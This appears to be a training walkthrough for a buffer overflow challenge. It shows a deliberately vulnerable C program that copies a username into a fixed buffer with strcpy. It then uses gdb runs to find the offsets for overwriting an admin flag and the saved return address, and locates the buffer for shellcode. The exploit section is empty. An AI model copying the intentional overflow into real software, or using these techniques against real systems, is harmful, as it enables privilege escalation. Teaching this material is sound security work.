# BoF intro

## Introduction

## Goal

## Source

File: `~/challenges/challenge12/challenge12.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <crypt.h>
#include <string.h>

// hash of: "ourteacheristehbest"
const char *adminHash = "$6$saaaaalty$cjw9qyAKmchl7kQMJxE5c1mHN0cXxfQNjs4EhcyULLndQR1wXslGCaZrJj5xRRBeflfvmpoIVv6Vs7ZOQwhcx.";


int checkPassword(char *password) {
	char *hash;

	// $6$ is SHA256
	hash = crypt(password, "$6$saaaaalty");

	if (strcmp(hash, adminHash) == 0) {
		return 1;
	} else {
		return 0;
	}
}


void handleData(char *username, char *password) {
	int isAdmin = 0;
	char firstname[64];

	isAdmin = checkPassword(password);
	strcpy(firstname, username);

	if(isAdmin > 0) {
		printf("You ARE admin!\nBe the force with you.\n");
	} else {
		printf("You are not admin.\nLame.\n");
	}
}


int main(int argc, char **argv) {
	if (argc != 3) {
		printf("Call: %s <name> <password>\n", argv[0]);
		exit(0);
	}

	handleData(argv[1], argv[2]);
}
```

You can compile it by calling `make` in the folder `~/challenges/challenge12`


## Analysis

```
root@hlUbuntu64:~/challenges/challenge12# file challenge12
challenge12: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9397ca5655aeb327386bb0d572717f9906978301, not stripped
```

## Normal behaviour


## Find offset

You can crash the program by giving longer and longer strings as first argument.

Depending on the amount of overflow, one of these conditions can appear:
- Not enough overflow: Program exits cleanly, `isAdmin` is 0x0
- Nearly enough overflow: Program exists cleanly, `isAdmin` is overflowed (has 0x41's)
- Overflow into SBP: Program crashes, but with `RIP` = 0x400833 or similar (no 0x41's)
- Overflow into SIP: Program crashes, with `RIP` = 0x0000004141 (what we want)
- Overflow too far into `SIP`: Program crashes, with `RIP` = 0x4007d3 or similar (again no 0x41's)

### Nearly enough overflow

Offset: 70

```
(gdb) run `python -c 'print "A" * 70 + "BBBB"'` test
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 70 + "BBBB"'` test
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
You are admin!
isAdmin: 0x4242
[Inferior 1 (process 504) exited normally]
```

### Overflow into SBP

Offset: 74

```
(gdb) run `python -c 'print "A" * 74 + "BBBB"'` test
Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 74 + "BBBB"'` test
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
You are admin!
isAdmin: 0x42424141

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400832 in main ()
```

### Overflow into SIP

Offset: 82

```
(gdb) run `python -c 'print "A" * 82 + "BBBB"'` test
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 82 + "BBBB"'` test
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
You are admin!
isAdmin: 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x0000000000004242 in ?? ()
```

Offset: 86
```
(gdb) run `python -c 'print "A" * 86 + "BBBB"'` test
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 86 + "BBBB"'` test
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
You are admin!
isAdmin: 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424141 in ?? ()
```

Therefore, offset is 84 bytes.


### Overflow too far into SIP

Offset: 88

```
(gdb) run `python -c 'print "A" * 88 + "BBBB"'` test
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 88 + "BBBB"'` test
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
You are admin!
isAdmin: 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007d3 in handleData ()
```


## Find buffer base address

Disassemble the main function:
```
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004007d4 <+0>:     push   %rbp
   0x00000000004007d5 <+1>:     mov    %rsp,%rbp
   0x00000000004007d8 <+4>:     sub    $0x10,%rsp
   0x00000000004007dc <+8>:     mov    %edi,-0x4(%rbp)
   0x00000000004007df <+11>:    mov    %rsi,-0x10(%rbp)
   0x00000000004007e3 <+15>:    cmpl   $0x3,-0x4(%rbp)
   0x00000000004007e7 <+19>:    je     0x40080c <main+56>
   0x00000000004007e9 <+21>:    mov    -0x10(%rbp),%rax
   0x00000000004007ed <+25>:    mov    (%rax),%rax
   0x00000000004007f0 <+28>:    mov    %rax,%rsi
   0x00000000004007f3 <+31>:    mov    $0x40099c,%edi
   0x00000000004007f8 <+36>:    mov    $0x0,%eax
   0x00000000004007fd <+41>:    callq  0x4005a0 <printf@plt>
   0x0000000000400802 <+46>:    mov    $0x0,%edi
   0x0000000000400807 <+51>:    callq  0x4005f0 <exit@plt>
   0x000000000040080c <+56>:    mov    -0x10(%rbp),%rax
   0x0000000000400810 <+60>:    add    $0x10,%rax
   0x0000000000400814 <+64>:    mov    (%rax),%rdx
   0x0000000000400817 <+67>:    mov    -0x10(%rbp),%rax
   0x000000000040081b <+71>:    add    $0x8,%rax
   0x000000000040081f <+75>:    mov    (%rax),%rax
   0x0000000000400822 <+78>:    mov    %rdx,%rsi
   0x0000000000400825 <+81>:    mov    %rax,%rdi
   0x0000000000400828 <+84>:    callq  0x40074f <handleData>
   0x000000000040082d <+89>:    mov    $0x0,%eax
   0x0000000000400832 <+94>:    leaveq
   0x0000000000400833 <+95>:    retq
End of assembler dump.
```

Lets break before calling `handleData`:
```
(gdb) b *0x0000000000400828
Breakpoint 1 at 0x400828
```

And run it with some dummy data:

```
(gdb) run AAAAAAAA BBBBBBBB
Starting program: /root/challenges/challenge12/challenge12 AAAAAAAA BBBBBBBB

Breakpoint 1, 0x0000000000400828 in main ()
```

`handleData(char *username, char *password)` has two arguments. Remember that in x64 function
call convention, the first argument for the function call is stored in `RDI`,
the second in `RDX`. We can check this:
```
(gdb) x/4x $rdi
0x7fffffffe87b: 0x41414141      0x41414141      0x42424200      0x42424242
(gdb) x/4x $rdx
0x7fffffffe884: 0x42424242      0x42424242      0x52455400      0x74783d4d
```

Therefore, the start of the buffer, where our future shellcode will be, is `0x7fffffffe87b`.




## Create an exploit
